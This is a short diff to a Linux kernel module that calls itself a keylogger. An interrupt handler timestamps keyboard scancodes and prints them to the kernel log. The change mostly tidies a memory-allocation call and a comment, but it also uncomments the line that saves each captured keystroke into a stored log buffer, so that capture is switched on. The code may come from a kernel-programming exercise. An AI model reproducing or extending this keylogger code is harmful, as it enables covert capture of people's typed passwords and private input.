@@ -38,7 +38,7 @@ t_keylogger_data keylogger_data;
 static int add_new_entry(char *entry)
 {
 	char *tmp_buff;
-	if (!(tmp_buff = vmalloc(keylogger_data.log_buffer ? strlen(entry) + strlen(keylogger_data.log_buffer) + 1 : strlen(entry) + 1)))
+	if (!(tmp_buff = vmalloc((keylogger_data.log_buffer ? strlen(entry) + strlen(keylogger_data.log_buffer) + 1 : strlen(entry) + 1))))
 	{
 		printk(KERN_ERR "Failed to allocate memory for new log entry\n");
 		return (1);
@@ -148,8 +148,8 @@ static irqreturn_t keylogger_handle(int irq_n, void *data)
 	generate_timestamp(log_line);
 	printk(KERN_INFO "%s ", log_line);
 	handle_scancode(key);
-	log_line[strlen(log_line)] = '\n'; //add a new line at end of our log entry
-//	add_new_entry(log_line);
+	log_line[strlen(log_line)] = '\n'; //add a newline at end of our log entry
+	add_new_entry(log_line);
 	return IRQ_HANDLED;
 }
 
